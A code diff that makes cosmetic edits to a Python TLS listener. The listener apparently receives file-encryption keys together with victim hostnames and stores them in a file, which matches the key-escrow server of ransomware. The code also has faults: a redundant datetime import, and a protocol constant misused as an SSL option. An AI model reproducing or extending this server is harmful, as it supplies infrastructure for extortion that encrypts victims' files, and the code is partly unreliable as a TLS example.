@@ -1,5 +1,5 @@
 # import
-import socket, ssl
+import socket, ssl, datetime
 from datetime import datetime
 # Variables :
 host = ""
@@ -8,8 +8,8 @@ port = 4000
 
 def store_key(key, hostname):
     """
-    Strore the key on a remote server with the hostame
-    :param key -- key to encrypt files:
+    Store the key on a remote server with the hostname
+    :param key -- key to encrypt the files:
     """
     # Variables
     filename = "key_file.txt"
@@ -31,10 +31,10 @@ context.options |= ssl.PROTOCOL_TLSv1_2
 
 # Server listening
 while True:
-    new_socket, from_addr = sock.accept()
-    sslSocket = context.wrap_socket(new_socket, server_side=True)
+    new_socket, _ = sock.accept()
+    tls_socket = context.wrap_socket(new_socket, server_side=True)
     # Receive the key and hostname
-    key = sslSocket.recv().decode()
-    hostname = sslSocket.recv().decode()
+    key = tls_socket.recv().decode()
+    hostname = tls_socket.recv().decode()
     # Call the "store_key()" function
     store_key(key, hostname)
